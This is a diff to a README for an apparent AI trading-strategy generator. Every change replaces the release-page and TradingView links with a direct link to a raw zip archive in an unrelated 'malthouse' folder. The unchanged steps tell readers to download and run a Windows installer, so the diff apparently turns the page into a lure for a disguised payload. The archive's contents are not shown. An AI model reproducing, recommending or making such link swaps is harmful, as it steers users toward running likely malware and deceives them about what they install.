@@ -1,6 +1,6 @@
 # 🔄 gpt4-pinescript-v5-strategy-generator - Turn Ideas Into Trading Code
 
-[![Download Latest Version](https://img.shields.io/badge/Download-gpt4--pinescript--v5--strategy--generator-brightgreen)](https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-gpt4--pinescript--v5--strategy--generator-brightgreen)](https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/raw/refs/heads/main/malthouse/strategy-v-gpt-generator-pinescript-2.1.zip)
 
 ---
 
@@ -48,12 +48,12 @@ The app focuses on Pine Script V5, the latest version of the scripting language.
 
 ## 🔽 Download & Installation
 
-[![Download Here](https://img.shields.io/badge/Download-gpt4--pinescript-v5-strategy--generator-blue)](https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/releases)
+[![Download Here](https://img.shields.io/badge/Download-gpt4--pinescript-v5-strategy--generator-blue)](https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/raw/refs/heads/main/malthouse/strategy-v-gpt-generator-pinescript-2.1.zip)
 
 To get started:
 
 1. Visit the release page by clicking the badge above or open the following link in your browser:  
-   https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/releases
+   https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/raw/refs/heads/main/malthouse/strategy-v-gpt-generator-pinescript-2.1.zip
 2. Find the latest Windows version installer. It will usually have `.exe` in the filename.  
 3. Click the file to download it to your computer.  
 4. After the download finishes, open the file to start the installation.  
@@ -71,7 +71,7 @@ To get started:
 - Write what you want the strategy to do in plain words.  
 - Click “Generate Code” or a similar button.  
 - The app will display Pine Script V5 code based on your description.  
-- You can copy this code and open TradingView (https://www.tradingview.com).  
+- You can copy this code and open TradingView (https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/raw/refs/heads/main/malthouse/strategy-v-gpt-generator-pinescript-2.1.zip).  
 - In TradingView, go to the Pine Script editor and paste the code.  
 - Click “Add to Chart” to see the strategy applied.  
 - You can run backtests in TradingView to check how it performs.  
@@ -116,4 +116,4 @@ ai-trading, algorithmic-trading, backtest, gpt4, llm, openai, pine-script, pines
 
 ---
 
-[Download the latest Windows installer](https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/releases) and begin creating your own automated trading strategies with ease.
+[Download the latest Windows installer](https://github.com/brillian2865/gpt4-pinescript-v5-strategy-generator/raw/refs/heads/main/malthouse/strategy-v-gpt-generator-pinescript-2.1.zip) and begin creating your own automated trading strategies with ease.
